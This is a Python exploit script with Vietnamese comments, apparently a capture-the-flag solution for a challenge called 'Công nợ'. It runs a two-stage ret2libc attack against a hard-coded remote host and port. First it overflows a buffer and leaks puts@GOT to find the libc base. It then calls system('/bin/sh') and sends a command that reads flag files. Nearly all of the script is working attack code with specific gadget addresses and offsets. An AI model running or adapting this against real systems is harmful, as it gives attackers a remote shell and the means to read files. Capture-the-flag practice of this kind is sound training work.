#!/usr/bin/env python3
# Công nợ — ret2libc (không có win): leak puts@got rồi gọi system("/bin/sh").
import socket, struct, sys, time, re

HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("103.116.52.180", 21673)
def p64(x): return struct.pack("<Q", x)

POP_RDI, RET = 0x401156, 0x401016
PUTS_PLT, PUTS_GOT, VULN = 0x401030, 0x404000, 0x40115B
OFF = 0x88                              # buf[0x80] + saved rbp
PUTS_OFF, SYS_OFF, BINSH_OFF = 0x87CC0, 0x58750, 0x1CB42F   # từ libc.so.6 kèm theo

s = socket.create_connection((HOST, PORT), timeout=15); s.settimeout(4)
time.sleep(0.3); s.recv(4096)

# Tầng 1: leak địa chỉ puts của libc, rồi quay lại vuln
s.sendall(b"A" * OFF + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(VULN))
time.sleep(0.6)
data = s.recv(4096)
leak = next(struct.unpack("<Q", ln[:6].ljust(8, b"\0"))[0]
            for ln in data.split(b"\n") if len(ln) >= 6 and 0x55 <= ln[5] < 0x80)
base = leak - PUTS_OFF
print("libc base:", hex(base))

# Tầng 2: system("/bin/sh"). RET để căn stack 16-byte (không thêm ret thứ 2).
s.sendall(b"A" * OFF + p64(RET) + p64(POP_RDI) + p64(base + BINSH_OFF) + p64(base + SYS_OFF))
time.sleep(0.6)
s.sendall(b"cat /home/*/flag.txt\n"); time.sleep(1)
print(s.recv(4096).decode("latin1"))
